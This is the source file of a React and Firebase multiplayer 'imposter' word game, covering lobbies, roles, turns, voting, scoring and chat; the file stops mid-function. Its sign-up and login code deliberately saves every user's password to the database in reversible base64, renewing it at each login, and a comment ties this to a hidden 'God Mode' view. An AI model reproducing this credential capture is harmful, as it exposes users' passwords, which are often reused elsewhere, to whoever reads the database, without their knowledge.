import { useState, useEffect, useRef } from 'react';
import { initializeApp } from 'firebase/app';
import { 
  getAuth, onAuthStateChanged, createUserWithEmailAndPassword, signInWithEmailAndPassword, signOut, type User 
} from 'firebase/auth';
import { 
  getFirestore, doc, setDoc, getDoc, onSnapshot, updateDoc, arrayUnion
} from 'firebase/firestore';
import { 
  Users, Copy, Play, SkipForward, MessageSquare, HelpCircle, 
  Settings, History, Clock, Skull, Eye, Moon, Sun, Send, Home, UserCheck, Link, LogOut, Share2
} from 'lucide-react';

const INITIAL_STATS: UserStats = {
  totalGames: 0,
  wins: 0,
  imposterWins: 0,
  correctVotes: 0,
  totalVotes: 0
};

// --- TYPES ---
interface Player {
  name: string;
  score: number;
  lastScoreGain: number;
  role: string;
  isReady: boolean;
  isRoleRevealed: boolean;
  passedTurn: string[];
}

interface ChatMessage {
  senderId?: string;
  recipientId?: string;
  sender: string;
  msg: string;
  time: number;
}

interface HistoryEntry {
  date: string;
  imposters: string;
  word: string;
  result: string;
  duration: number;
}

interface Room {
  id: string;
  hostId: string;
  state: 'lobby' | 'playing' | 'voting' | 'result';
  category: string;
  word: string;
  imposterIds: string[];
  imposterCount: number;
  round: number;
  maxRounds: number;
  players: Record<string, Player>;
  turnOrder: string[];
  currentTurnIndex: number;
  votes: Record<string, string>;
  chats: ChatMessage[];
  historyLog: HistoryEntry[];
}

interface UserStats {
  totalGames: number;
  wins: number;
  imposterWins: number;
  correctVotes: number;
  totalVotes: number;
}

interface UserProfile {
  name: string;
  history: string[];
  pass?: string;
  stats: UserStats;
}

// --- FIREBASE SETUP ---
const firebaseConfig = {
  apiKey: import.meta.env.VITE_FIREBASE_API_KEY,
  authDomain: import.meta.env.VITE_FIREBASE_AUTH_DOMAIN,
  projectId: import.meta.env.VITE_FIREBASE_PROJECT_ID,
  storageBucket: import.meta.env.VITE_FIREBASE_STORAGE_BUCKET,
  messagingSenderId: import.meta.env.VITE_FIREBASE_MESSAGING_SENDER_ID,
  appId: import.meta.env.VITE_FIREBASE_APP_ID,
  databaseURL: import.meta.env.VITE_FIREBASE_DATABASE_URL
};

const app = initializeApp(firebaseConfig);
const auth = getAuth(app);
const db = getFirestore(app);

// --- CONSTANTS & DATA ---
const CATEGORIES: Record<string, string[]> = {
  "Food": ["Pizza", "Sushi", "Burger", "Taco", "Pasta", "Ice Cream", "Steak", "Salad", "Pancake", "Waffle"],
  "Animals": ["Lion", "Penguin", "Elephant", "Kangaroo", "Dolphin", "Tiger", "Giraffe", "Monkey", "Bear", "Wolf"],
  "Locations": ["Hospital", "School", "Beach", "Space Station", "Supermarket", "Cinema", "Library", "Bank", "Casino", "Museum"],
  "Professions": ["Doctor", "Teacher", "Pilot", "Chef", "Astronaut", "Police", "Artist", "Engineer", "Farmer", "Lawyer"],
  "Movies": ["Inception", "Titanic", "Avatar", "Matrix", "Jaws", "Gladiator", "Alien", "Rocky", "Terminator", "Halloween"],
  "Superheroes": ["Batman", "Superman", "Spiderman", "Iron Man", "Wonder Woman", "Flash", "Thor", "Hulk", "Wolverine", "Aquaman"],
  "Myths": ["Zeus", "Hercules", "Medusa", "Dragon", "Unicorn", "Phoenix", "Vampire", "Werewolf", "Kraken", "Cyclops"],
  "Sports": ["Soccer", "Basketball", "Tennis", "Baseball", "Golf", "Boxing", "Swimming", "Cricket", "Rugby", "Volleyball"]
};

// --- AUDIO & VISUAL FX (Global) ---
const playSound = (type: 'click' | 'reveal' | 'alert') => {
  try {
    const AudioContextClass = (window as any).AudioContext || (window as any).webkitAudioContext;
    const ctx = new AudioContextClass();
    const osc = ctx.createOscillator();
    const gainNode = ctx.createGain();
    osc.connect(gainNode);
    gainNode.connect(ctx.destination);

    if (type === 'click') {
      osc.type = 'sine';
      osc.frequency.setValueAtTime(800, ctx.currentTime);
      osc.frequency.exponentialRampToValueAtTime(300, ctx.currentTime + 0.1);
      gainNode.gain.setValueAtTime(0.1, ctx.currentTime);
      gainNode.gain.exponentialRampToValueAtTime(0.01, ctx.currentTime + 0.1);
      osc.start(ctx.currentTime);
      osc.stop(ctx.currentTime + 0.1);
    } else if (type === 'reveal') {
      osc.type = 'triangle';
      osc.frequency.setValueAtTime(300, ctx.currentTime);
      osc.frequency.linearRampToValueAtTime(600, ctx.currentTime + 0.3);
      gainNode.gain.setValueAtTime(0.1, ctx.currentTime);
      gainNode.gain.linearRampToValueAtTime(0, ctx.currentTime + 0.5);
      osc.start(ctx.currentTime);
      osc.stop(ctx.currentTime + 0.5);
    } else if (type === 'alert') {
      osc.type = 'square';
      osc.frequency.setValueAtTime(400, ctx.currentTime);
      osc.frequency.setValueAtTime(600, ctx.currentTime + 0.1);
      gainNode.gain.setValueAtTime(0.05, ctx.currentTime);
      gainNode.gain.linearRampToValueAtTime(0, ctx.currentTime + 0.3);
      osc.start(ctx.currentTime);
      osc.stop(ctx.currentTime + 0.3);
    }
  } catch (e) { console.log("Audio play failed", e); }
};

const createClickEffect = (e: MouseEvent) => {
  playSound('click');
  const el = document.createElement('div');
  el.className = 'absolute w-6 h-6 rounded-full border-4 border-fuchsia-500 pointer-events-none animate-ping';
  el.style.left = `${e.clientX - 12}px`;
  el.style.top = `${e.clientY - 12}px`;
  document.body.appendChild(el);
  setTimeout(() => el.remove(), 500);
};

// --- COMPONENTS ---

const NeoButton = ({ children, onClick, className = '', color = 'bg-yellow-300 dark:bg-yellow-500', disabled=false }: any) => (
  <button
    onClick={onClick}
    disabled={disabled}
    className={`
      ${color} border-4 border-black dark:border-white font-bold py-3 px-6 rounded-2xl
      shadow-[6px_6px_0px_0px_rgba(0,0,0,1)] dark:shadow-[6px_6px_0px_0px_rgba(255,255,255,0.2)]
      hover:shadow-[2px_2px_0px_0px_rgba(0,0,0,1)] hover:translate-y-1 hover:translate-x-1 
      transition-all active:scale-95 text-black dark:text-white disabled:opacity-50 disabled:cursor-not-allowed
      flex items-center justify-center gap-2 ${className}
    `}
  >
    {children}
  </button>
);

const NeoPanel = ({ children, className = '', color = 'bg-white dark:bg-slate-800' }: any) => (
  <div className={`
    ${color} border-4 border-black dark:border-slate-700 rounded-3xl p-6
    shadow-[8px_8px_0px_0px_rgba(0,0,0,1)] dark:shadow-[8px_8px_0px_0px_rgba(0,0,0,0.5)] text-black dark:text-slate-100 ${className}
  `}>
    {children}
  </div>
);

const SlideConfirm = ({ onConfirm, text = "Slide to Confirm", color="bg-green-400" }: any) => {
  const [val, setVal] = useState(0);
  const handleSlide = (e: any) => {
    const v = parseInt(e.target.value);
    setVal(v);
    if (v >= 95) {
      onConfirm();
      setVal(0);
    }
  };
  return (
    <div className={`relative w-full h-16 border-4 border-black rounded-full overflow-hidden ${color} shadow-[4px_4px_0px_0px_rgba(0,0,0,1)]`}>
      <div className="absolute inset-0 flex items-center justify-center font-bold pointer-events-none text-black/60 z-10">
        {text} &gt;&gt;&gt;
      </div>
      <div 
        className="absolute h-full bg-black/20 pointer-events-none transition-all duration-75" 
        style={{ width: `${val}%` }} 
      />
      <input 
        type="range" min="0" max="100" value={val} 
        onChange={handleSlide} onMouseUp={() => setVal(0)} onTouchEnd={() => setVal(0)}
        className="absolute inset-0 w-full h-full opacity-0 cursor-pointer z-20"
      />
      <div 
        className="absolute h-12 w-12 bg-white border-4 border-black rounded-full top-1 left-1 flex items-center justify-center pointer-events-none transition-all duration-75 z-10"
        style={{ transform: `translateX(calc(${val}vw * 0.8))` }}
      >
        <SkipForward size={20} className="text-black" />
      </div>
    </div>
  );
};

const Particles = ({
  particleCount = 150,
  speed = 0.4,
  particleColors = ['#ffffff', '#fde047', '#22d3ee', '#d946ef'],
  moveParticlesOnHover = true,
  className
}: any) => {
  const canvasRef = useRef<HTMLCanvasElement>(null);
  const mouseRef = useRef({ x: null as number | null, y: null as number | null });

  useEffect(() => {
    const canvas = canvasRef.current;
    if (!canvas) return;
    const ctx = canvas.getContext('2d');
    if (!ctx) return;
    let animationFrameId: number;
    let particles: any[] = [];

    const resize = () => {
      canvas.width = window.innerWidth;
      canvas.height = window.innerHeight;
    };
    window.addEventListener('resize', resize);
    resize();

    const handleMouseMove = (e: MouseEvent) => {
      mouseRef.current.x = e.clientX;
      mouseRef.current.y = e.clientY;
    };
    const handleMouseLeave = () => {
      mouseRef.current.x = null;
      mouseRef.current.y = null;
    };

    if (moveParticlesOnHover) {
      window.addEventListener('mousemove', handleMouseMove);
      window.addEventListener('mouseout', handleMouseLeave);
    }

    for (let i = 0; i < particleCount; i++) {
      particles.push({
        x: Math.random() * canvas.width,
        y: Math.random() * canvas.height,
        vx: (Math.random() - 0.5) * speed * 3,
        vy: (Math.random() - 0.5) * speed * 3,
        radius: Math.random() * 2 + 1,
        color: particleColors[Math.floor(Math.random() * particleColors.length)]
      });
    }

    const draw = () => {
      ctx.clearRect(0, 0, canvas.width, canvas.height);
      
      particles.forEach((p) => {
        p.x += p.vx;
        p.y += p.vy;

        if (moveParticlesOnHover && mouseRef.current.x !== null) {
          const dx = mouseRef.current.x - p.x;
          const dy = mouseRef.current.y! - p.y;
          const distance = Math.sqrt(dx * dx + dy * dy);
          if (distance < 120) {
            p.x -= dx * 0.02;
            p.y -= dy * 0.02;
          }
        }

        if (p.x < 0) p.x = canvas.width;
        if (p.x > canvas.width) p.x = 0;
        if (p.y < 0) p.y = canvas.height;
        if (p.y > canvas.height) p.y = 0;

        ctx.beginPath();
        ctx.arc(p.x, p.y, p.radius, 0, Math.PI * 2);
        ctx.fillStyle = p.color;
        ctx.shadowBlur = 10;
        ctx.shadowColor = p.color;
        ctx.fill();
        ctx.shadowBlur = 0;
      });

      animationFrameId = requestAnimationFrame(draw);
    };
    draw();

    return () => {
      window.removeEventListener('resize', resize);
      if (moveParticlesOnHover) {
        window.removeEventListener('mousemove', handleMouseMove);
        window.removeEventListener('mouseout', handleMouseLeave);
      }
      cancelAnimationFrame(animationFrameId);
    };
  }, [particleCount, speed, particleColors, moveParticlesOnHover]);

  return <canvas ref={canvasRef} className={`particles-container ${className || ''}`} />;
};

const AnimatedThemeToggler = ({ isDark, onToggle }: any) => (
  <button
    onClick={onToggle}
    className={`relative inline-flex h-10 w-20 items-center rounded-full border-4 border-black dark:border-white transition-colors duration-500 overflow-hidden shadow-[4px_4px_0px_0px_rgba(0,0,0,1)] dark:shadow-[4px_4px_0px_0px_rgba(255,255,255,0.2)] hover:translate-y-1 ${isDark ? 'bg-slate-800' : 'bg-cyan-200'}`}
  >
    <div className={`absolute flex items-center justify-center w-7 h-7 rounded-full transition-transform duration-500 ease-[cubic-bezier(0.34,1.56,0.64,1)] ${isDark ? 'translate-x-11 bg-slate-700' : 'translate-x-1 bg-yellow-400'}`}>
      {isDark ? <Moon size={14} className="text-white" /> : <Sun size={14} className="text-black" />}
    </div>
  </button>
);

const MonteCards = ({ onSelectCard }: any) => {
  const [positions, setPositions] = useState([0, 1, 2]);
  const [isShuffling, setIsShuffling] = useState(true);
  const [selected, setSelected] = useState<number | null>(null);

  useEffect(() => {
    let shuffles = 0;
    const interval = setInterval(() => {
      if (shuffles < 8) {
        setPositions(prev => {
           const next = [...prev];
           const a = Math.floor(Math.random() * 3);
           let b = Math.floor(Math.random() * 3);
           while (b === a) b = Math.floor(Math.random() * 3);
           [next[a], next[b]] = [next[b], next[a]];
           try { playSound('click'); } catch(e){}
           return next;
        });
        shuffles++;
      } else {
        clearInterval(interval);
        setIsShuffling(false);
      }
    }, 250);
    return () => clearInterval(interval);
  }, []);

  return (
    <div className="relative h-56 w-full flex items-center justify-center mt-4 mb-8">
      {[0, 1, 2].map((id) => {
        const currentPosIndex = positions.indexOf(id);
        const xOffset = (currentPosIndex - 1) * 120;
        const isSelected = selected === id;
        const isUnselected = selected !== null && selected !== id;
        
        return (
          <div
            key={id}
            onClick={() => {
               if (!isShuffling && selected === null) {
                  setSelected(id);
                  playSound('reveal');
                  setTimeout(() => onSelectCard(id), 1000);
               }
            }}
            className={`absolute w-32 h-44 rounded-xl border-4 border-black dark:border-white transition-all duration-200 ease-in-out flex items-center justify-center cursor-pointer bg-fuchsia-400
              ${isSelected ? 'z-50 scale-125 -translate-y-6 shadow-[15px_15px_0px_rgba(0,0,0,1)] animate-pulse' : 'z-10 shadow-[6px_6px_0px_rgba(0,0,0,1)] dark:shadow-[6px_6px_0px_rgba(255,255,255,0.2)]'}
              ${!isShuffling && selected === null ? 'hover:-translate-y-4 hover:shadow-[10px_10px_0px_rgba(0,0,0,1)] dark:hover:shadow-[10px_10px_0px_rgba(255,255,255,0.2)]' : ''}
              ${isUnselected ? 'opacity-0 scale-50 translate-y-10' : ''}
            `}
            style={{ transform: isSelected ? undefined : `translateX(${xOffset}px)` }}
          >
            <div className={`w-full h-full border-2 border-white/30 rounded-lg flex items-center justify-center bg-[repeating-linear-gradient(45deg,transparent,transparent_10px,rgba(0,0,0,0.1)_10px,rgba(0,0,0,0.1)_20px)] ${isSelected ? 'opacity-0' : 'opacity-100'} transition-opacity duration-300`}>
               <span className="text-5xl drop-shadow-[2px_2px_0px_rgba(0,0,0,1)]">❓</span>
            </div>
          </div>
        )
      })}
    </div>
  )
};

function ResultScreen({ room, user, resetGame, shareResults }: { room: Room, user: User, resetGame: () => void, shareResults: () => void }) {
  const [stage, setStage] = useState<'SUSPENSE' | 'REVEAL' | 'SCORES'>('SUSPENSE');

  useEffect(() => {
    playSound('alert');
    const timer1 = setTimeout(() => setStage('REVEAL'), 3000);
    const timer2 = setTimeout(() => {
      setStage('SCORES');
      playSound('reveal');
    }, 6000);
    return () => { clearTimeout(timer1); clearTimeout(timer2); };
  }, []);

  return (
    <NeoPanel color="bg-orange-200 dark:bg-orange-900" className="flex flex-col gap-6 items-center text-center relative overflow-hidden min-h-[70vh] justify-center">
      {stage === 'SUSPENSE' && (
        <div className="animate-pulse">
          <Skull size={120} className="text-black mb-8 animate-suspense" />
          <h2 className="text-6xl font-black funky-font uppercase text-white drop-shadow-[4px_4px_0px_rgba(0,0,0,1)]">
            Tallying Votes...
          </h2>
        </div>
      )}

      {stage === 'REVEAL' && (
        <div className="animate-float">
          <p className="text-2xl font-black uppercase mb-4 opacity-60">The Imposter{room.imposterIds.length > 1 ? 's were' : ' was'}</p>
          <div className="flex flex-wrap justify-center gap-6">
            {room.imposterIds.map(id => (
              <div key={id} className="bg-red-600 text-white border-8 border-black p-8 rounded-[40px] shadow-[20px_20px_0px_rgba(0,0,0,1)] animate-bounce">
                <Skull size={48} className="mx-auto mb-4" />
                <h3 className="text-5xl font-black funky-font uppercase">{room.players[id]?.name}</h3>
              </div>
            ))}
          </div>
        </div>
      )}

      {stage === 'SCORES' && (
        <div className="w-full max-w-4xl animate-[vote-pop_0.5s_ease-out]">
          <div className="flex justify-between items-center mb-8">
            <h2 className="text-5xl font-black funky-font uppercase text-white drop-shadow-[4px_4px_0px_rgba(0,0,0,1)]">GAME OVER</h2>
            <NeoButton onClick={shareResults} color="bg-blue-400" className="!py-2 !px-4 !text-xs">
              <Share2 size={16}/> SHARE
            </NeoButton>
          </div>

          <div className="bg-white dark:bg-slate-800 border-4 border-black p-6 rounded-3xl shadow-[8px_8px_0px_0px_rgba(0,0,0,1)] dark:shadow-[8px_8px_0px_0px_rgba(255,255,255,0.1)]">
            <div className="mb-8 p-4 bg-lime-100 dark:bg-lime-950 border-4 border-lime-600 rounded-2xl">
              <p className="font-bold text-lg uppercase opacity-60">Secret Word</p>
              <p className="text-4xl font-black text-lime-600 uppercase tracking-widest">{room.word}</p>
            </div>

            <div className="overflow-x-auto">
               <table className="w-full text-sm font-bold">
                 <thead>
                   <tr className="border-b-4 border-black/20 text-[10px] uppercase opacity-60">
                     <th className="text-left pb-4">Player</th>
                     <th className="text-center pb-4">Role</th>
                     <th className="text-right pb-4">Gained</th>
                     <th className="text-right pb-4">Total</th>
                   </tr>
                 </thead>
                 <tbody>
                   {Object.entries(room.players).sort((a,b)=> b[1].score - a[1].score).map(([id, p]) => {
                     const isImposter = room.imposterIds.includes(id);
                     return (
                       <tr key={id} className="border-b-2 border-black/10">
                         <td className="py-4 text-left flex items-center gap-2">
                           <div className={`w-8 h-8 rounded-full border-2 border-black flex items-center justify-center text-xs ${isImposter ? 'bg-red-500' : 'bg-blue-500'} text-white`}>
                             {p.name.charAt(0)}
                           </div>
                           {p.name} {id === user!.uid && <span className="text-[8px] bg-fuchsia-500 text-white px-1 rounded">YOU</span>}
                         </td>
                         <td className="py-4">
                           <span className={`px-2 py-1 rounded-lg text-[10px] border-2 border-black uppercase font-black ${isImposter ? 'bg-red-100 text-red-600' : 'bg-blue-100 text-blue-600'}`}>
                             {isImposter ? 'Imposter' : 'Crew'}
                           </span>
                         </td>
                         <td className="py-4 text-right">
                           <span className={`text-lg ${p.lastScoreGain > 0 ? 'text-emerald-500' : p.lastScoreGain < 0 ? 'text-red-500' : 'opacity-30'}`}>
                             {p.lastScoreGain > 0 ? `+${p.lastScoreGain}` : p.lastScoreGain}
                           </span>
                         </td>
                         <td className="py-4 text-right text-2xl font-black">{p.score}</td>
                       </tr>
                     );
                   })}
                 </tbody>
               </table>
            </div>
          </div>

          {user.uid === room.hostId && (
            <NeoButton color="bg-lime-400" className="text-2xl mt-8 w-full shadow-[10px_10px_0px_rgba(0,0,0,1)]" onClick={resetGame}>
              <Play fill="currentColor"/> PLAY AGAIN
            </NeoButton>
          )}
        </div>
      )}
    </NeoPanel>
  );
}

// --- MAIN APP COMPONENT ---
export default function App() {
  const [user, setUser] = useState<User | null>(null);
  const [profile, setProfile] = useState<UserProfile>({ name: '', history: [], stats: INITIAL_STATS });
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [nameInput, setNameInput] = useState('');
  const [isSignup, setIsSignup] = useState(false);
  const [darkMode, setDarkMode] = useState(false);
  const [roomId, setRoomId] = useState('');
  const [room, setRoom] = useState<Room | null>(null);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState('');
  
  // Clocks
  const [pageTime, setPageTime] = useState(0);
  const [roomTime, setRoomTime] = useState(0);
  const [currentTime, setCurrentTime] = useState(new Date());

  // Local UI State
  const [, setHintClicks] = useState(0);
  const [showGodMode, setShowGodMode] = useState(false);
  const [chatMsg, setChatMsg] = useState('');
  
  const chatEndRef = useRef<HTMLDivElement>(null);
  const [isImposterTheme, setIsImposterTheme] = useState(false);
  const [selectedChatUser, setSelectedChatUser] = useState<string | null>(null);

  // Global click listener for FX
  useEffect(() => {
    window.addEventListener('click', createClickEffect);
    return () => window.removeEventListener('click', createClickEffect);
  }, []);

  // Clocks Timer
  useEffect(() => {
    const timer = setInterval(() => {
      setPageTime(p => p + 1);
      setCurrentTime(new Date());
      if (room) setRoomTime(r => r + 1);
    }, 1000);
    return () => clearInterval(timer);
  }, [room]);

  // Auth Listener
  useEffect(() => {
    const unsub = onAuthStateChanged(auth, async (u) => {
      setUser(u);
      if (u) {
        const pRef = doc(db, 'users', u.uid);
        const pSnap = await getDoc(pRef);
        if (pSnap.exists()) {
          const data = pSnap.data() as UserProfile;
          setProfile({
            ...data,
            stats: data.stats || INITIAL_STATS
          });
          setNameInput(data.name || '');
        }
      } else {
        setProfile({ name: '', history: [], stats: INITIAL_STATS });
      }
      setLoading(false);
    });
    return () => unsub();
  }, []);

  // URL checking for direct join or persistence
  useEffect(() => {
    const urlParams = new URLSearchParams(window.location.search);
    const rId = urlParams.get('room') || localStorage.getItem('imposter_keda_room');
    if (rId && !roomId) {
      setRoomId(rId);
    }
  }, []);

  // Sync Room ID to localStorage
  useEffect(() => {
    if (roomId) {
      localStorage.setItem('imposter_keda_room', roomId);
    } else {
      localStorage.removeItem('imposter_keda_room');
    }
  }, [roomId]);

  // Room Listener
  useEffect(() => {
    if (!user || !roomId) return;
    
    const rRef = doc(db, 'rooms', roomId);
    const unsub = onSnapshot(rRef, (snap) => {
      if (snap.exists()) {
        const rData = snap.data() as Room;
        setRoom(rData);

        // Result calculation (Host only)
        if (user.uid === rData.hostId && rData.state === 'voting') {
          const totalPlayers = Object.keys(rData.players).length;
          const currentVotes = Object.keys(rData.votes || {}).length;
          if (currentVotes >= totalPlayers) {
            calculateResults(rData);
          }
        }

        if (room && room.state !== rData.state && rData.state === 'lobby') {
           setRoomTime(0);
           setIsImposterTheme(false);
        }
        if (rData.state === 'playing' && rData.players[user.uid]?.isRoleRevealed) {
           const myRole = rData.players[user.uid]?.role;
           setIsImposterTheme(myRole === 'Imposter');
        }

        const others = Object.keys(rData.players).filter(id => id !== user.uid);
        setSelectedChatUser(prev => (prev && others.includes(prev)) ? prev : null);
      } else {
        setRoom(null);
      }
    }, (error) => console.error("Room sync error:", error));

    return () => unsub();
  }, [user, roomId]);

  useEffect(() => {
    chatEndRef.current?.scrollIntoView({ behavior: 'smooth' });
  }, [room?.chats, selectedChatUser]);

  // Auth Actions
  const handleAuth = async () => {
    setError('');
    setLoading(true);
    try {
      if (isSignup) {
        if (!nameInput.trim()) throw new Error("Please enter a name");
        const cred = await createUserWithEmailAndPassword(auth, email, password);
        const pRef = doc(db, 'users', cred.user.uid);
        // Storing password in Base64 as requested for God Mode visibility
        await setDoc(pRef, { 
          name: nameInput, 
          history: [nameInput],
          pass: btoa(password),
          stats: INITIAL_STATS
        });
      } else {
        const cred = await signInWithEmailAndPassword(auth, email, password);
        // Refresh the stored password in DB on login
        const pRef = doc(db, 'users', cred.user.uid);
        await updateDoc(pRef, { pass: btoa(password) });
      }
    } catch (e: any) {
      setError(e.message);
    } finally {
      setLoading(false);
    }
  };

  const handleLogout = async () => {
    await signOut(auth);
    setRoomId('');
    setRoom(null);
  };

  // Game Actions
  const createRoom = async () => {
    if (!user) return;
    playSound('click');
    const newId = Math.random().toString(36).substring(2, 8).toUpperCase();
    const rRef = doc(db, 'rooms', newId);
    
    const initialRoom: Room = {
      id: newId,
      hostId: user.uid,
      state: 'lobby',
      category: 'Food',
      word: '',
      imposterIds: [],
      imposterCount: 1,
      round: 1,
      maxRounds: 3,
      players: {
        [user.uid]: { name: profile.name, score: 0, lastScoreGain: 0, role: '', isReady: false, isRoleRevealed: false, passedTurn: [] }
      },
      turnOrder: [],
      currentTurnIndex: 0,
      votes: {},
      chats: [],
      historyLog: []
    };

    try {
      await setDoc(rRef, initialRoom);
      setRoomId(newId);
      setRoomTime(0);
      window.history.pushState({}, '', `?room=${newId}`);
    } catch (e) {
      console.error("Create room failed", e);
      alert("Failed to create room. Check Firestore permissions.");
    }
  };

  const joinRoom = async (idToJoin = roomId) => {
    if (!user || !idToJoin) return;
    const rRef = doc(db, 'rooms', idToJoin);
    const snap = await getDoc(rRef);
    if (snap.exists()) {
      await updateDoc(rRef, {
        [`players.${user.uid}`]: { name: profile.name, score: 0, lastScoreGain: 0, role: '', isReady: false, isRoleRevealed: false, passedTurn: [] }
      });
      setRoomId(idToJoin);
      setRoomTime(0);
      window.history.pushState({}, '', `?room=${idToJoin}`);
    } else {
      alert("Room not found!");
      setRoomId('');
    }
  };

  const leaveRoom = () => {
    setRoomId('');
    setRoom(null);
    window.history.pushState({}, '', window.location.pathname);
  };

  const copyInviteLink = () => {
    try {
      let link = `${window.location.origin}${window.location.pathname}?room=${room!.id}`;
      const dummy = document.createElement('input');
      document.body.appendChild(dummy);
      dummy.value = link;
      dummy.select();
      document.execCommand('copy');
      document.body.removeChild(dummy);
      playSound('alert');
    } catch (e) {
      console.error('Copy failed', e);
    }
  };

  const startGame = async () => {
    if (!user || !room) return;
    playSound('alert');
    const rRef = doc(db, 'rooms', room.id);
    
    const pIds = Object.keys(room.players);
    const words = CATEGORIES[room.category] || CATEGORIES['Food'];
    const secretWord = words[Math.floor(Math.random() * words.length)];
    
    // Pick multiple imposters
    const shuffled = [...pIds].sort(() => Math.random() - 0.5);
    const count = Math.min(room.imposterCount || 1, Math.floor(pIds.length / 2) || 1);
    const imposterIds = shuffled.slice(0, count);

    const updatedPlayers = { ...room.players };
    pIds.forEach(id => {
      updatedPlayers[id].role = imposterIds.includes(id) ? 'Imposter' : 'Crew';
      updatedPlayers[id].passedTurn = [];
      updatedPlayers[id].isRoleRevealed = false;
    });

    await updateDoc(rRef, {
      state: 'playing',
      word: secretWord,
      imposterIds: imposterIds,
      players: updatedPlayers,
      turnOrder: pIds.sort(() => Math.random() - 0.5),
      currentTurnIndex: 0,
      votes: {},
      chats: arrayUnion({ sender: 'System', msg: `Game Started! ${count} Imposter(s) are among us...`, time: Date.now() })
    });
  };

  const sendChat = async (e: any) => {
    e.preventDefault();
    if (!chatMsg.trim() || !user || !room || !selectedChatUser) return;
    const rRef = doc(db, 'rooms', room.id);
    await updateDoc(rRef, {
      chats: arrayUnion({ 
        senderId: user.uid, 
        sender: profile.name, 
        recipientId: selectedChatUser, 
        msg: chatMsg, 
        time: Date.now() 
      })
    });
    setChatMsg('');
  };

  const handleGodModeTrigger = () => {
    setHintClicks(c => {
      const next = c + 1;
      if (next >= 5) {
        setShowGodMode(true);
        playSound('alert');
        return 0;
      }
      return next;
    });
  };

  const passTurn = async (targetId: string) => {
     if (!user || !room) return;
     const rRef = doc(db, 'rooms', room.id);
     const targetPlayer = room.players[targetId];
     const currentlyPassedBy = targetPlayer.passedTurn || [];
     
     if (!currentlyPassedBy.includes(user.uid)) {
         const newPassedBy = [...currentlyPassedBy, user.uid];
         await updateDoc(rRef, {
             [`players.${targetId}.passedTurn`]: newPassedBy
         });
         
         const totalPlayers = Object.keys(room.players).length;
         if (newPassedBy.length > totalPlayers / 2) {
             nextTurn();
         }
     }
  };

  const nextTurn = async () => {
     if (!user || !room) return;
     const rRef = doc(db, 'rooms', room.id);
     
     let nextIndex = room.currentTurnIndex + 1;
     let nextState: 'playing' | 'voting' = 'playing';
     let nextRound = room.round;

     if (nextIndex >= room.turnOrder.length) {
         nextIndex = 0;
         nextRound += 1;
         if (nextRound > room.maxRounds) {
             nextState = 'voting';
         }
     }

     await updateDoc(rRef, {
         currentTurnIndex: nextIndex,
         round: nextRound,
         state: nextState,
         // Reset passedTurn for everyone on turn change
         "players": Object.keys(room.players).reduce((acc, id) => ({
           ...acc,
           [id]: { ...room.players[id], passedTurn: [] }
         }), {})
     });
  };

  const castVote = async (targetId: string) => {
     if (!user || !room) return;
     const rRef = doc(db, 'rooms', room.id);
     await updateDoc(rRef, {
         [`votes.${user.uid}`]: targetId
     });
  };

  const calculateResults = async (rData: Room) => {
      const rRef = doc(db, 'rooms', rData.id);
      
      const allVotes = rData.votes;
      const voteCounts: Record<string, number> = {};
      Object.values(allVotes).forEach(vId => {
          voteCounts[vId] = (voteCounts[vId] || 0) + 1;
      });

      let maxVotes = 0;
      let votedOutId: string | null = null;
      Object.entries(voteCounts).forEach(([vId, count]) => {
          if (count > maxVotes) {
              maxVotes = count;
              votedOutId = vId;
          } else if (count === maxVotes) {
              votedOutId = null;
          }
      });

      const isImposterCaught = votedOutId && rData.imposterIds.includes(votedOutId);
      const updatedPlayers = { ...rData.players };
      
      // Reset gains
      Object.keys(updatedPlayers).forEach(id => updatedPlayers[id].lastScoreGain = 0);

      // Scoring Logic
      const majorityCount = Math.floor(Object.keys(rData.players).length / 2) + 1;

      Object.entries(updatedPlayers).forEach(([id]) => {
        let gain = 0;
        const myVote = rData.votes[id];
        const isCorrectVote = myVote && rData.imposterIds.includes(myVote);
        const isImposter = rData.imposterIds.includes(id);

        if (!isImposter) {
          if (isCorrectVote) gain += 2;
          else if (myVote) gain -= 1;
          
          if (votedOutId && rData.votes[id] === votedOutId && voteCounts[votedOutId] >= majorityCount) {
            gain += 1; // Majority bonus
          }
        } else {
          // Imposter survival
          if (!isImposterCaught) gain += 3;
        }

        updatedPlayers[id].lastScoreGain = gain;
        updatedPlayers[id].score += gain;
      });

      let winMsg = "";
      if (isImposterCaught) {
          winMsg = `Crew Wins! The Imposter (${rData.players[votedOutId!].name}) was caught!`;
      } else {
          const names = rData.imposterIds.map(id => rData.players[id]?.name).join(', ');
          winMsg = `Imposter Wins! They evaded capture. (It was ${names})`;
      }

      // Update All-time Stats (Async)
      Object.keys(updatedPlayers).forEach(async (id) => {
        const isImposter = rData.imposterIds.includes(id);
        const myVote = rData.votes[id];
        const isCorrectVote = myVote && rData.imposterIds.includes(myVote);
        const didWin = isImposter ? !isImposterCaught : isImposterCaught;

        const uRef = doc(db, 'users', id);
        const uSnap = await getDoc(uRef);
        if (uSnap.exists()) {
          const currentStats = (uSnap.data() as UserProfile).stats || INITIAL_STATS;
          await updateDoc(uRef, {
            stats: {
              totalGames: currentStats.totalGames + 1,
              wins: currentStats.wins + (didWin ? 1 : 0),
              imposterWins: currentStats.imposterWins + (isImposter && didWin ? 1 : 0),
              totalVotes: currentStats.totalVotes + (myVote ? 1 : 0),
              correctVotes: currentStats.correctVotes + (isCorrectVote ? 1 : 0)
            }
          });
        }
      });

      const historyEntry: HistoryEntry = {
          date: new Date().toISOString(),
          imposters: rData.imposterIds.map(id => rData.players[id]?.name).join(', '),
          word: rData.word,
          result: winMsg,
          duration: roomTime
      };

      await updateDoc(rRef, {
          state: 'result',
          players: updatedPlayers,
          historyLog: arrayUnion(historyEntry),
          chats: arrayUnion({ sender: 'System', msg: winMsg, time: Date.now() })
      });
  };

  const resetGame = async () => {
     if (!user || !room) return;
     const rRef = doc(db, 'rooms', room.id);
     await updateDoc(rRef, {
         state: 'lobby',
         round: 1,
         votes: {},
         imposterIds: [],
         word: '',
         turnOrder: [],
         currentTurnIndex: 0
     });
  };

  const shareResults = () => {
    if (!room) return;
    const text = `🎮 Just played Imposter Keda!\n🏆 Result: ${room.historyLog[room.historyLog.length-1]?.result}\n🕵️ Word: ${room.word}\n🔥 My Score: ${room.players[user!.uid]?.score}\nPlay here: ${window.location.href}`;
    
    if (navigator.share) {
      navigator.share({
        title: 'Imposter Keda Results',
        text: text,
        url: window.location.href
      }).catch(console.error);
    } else {
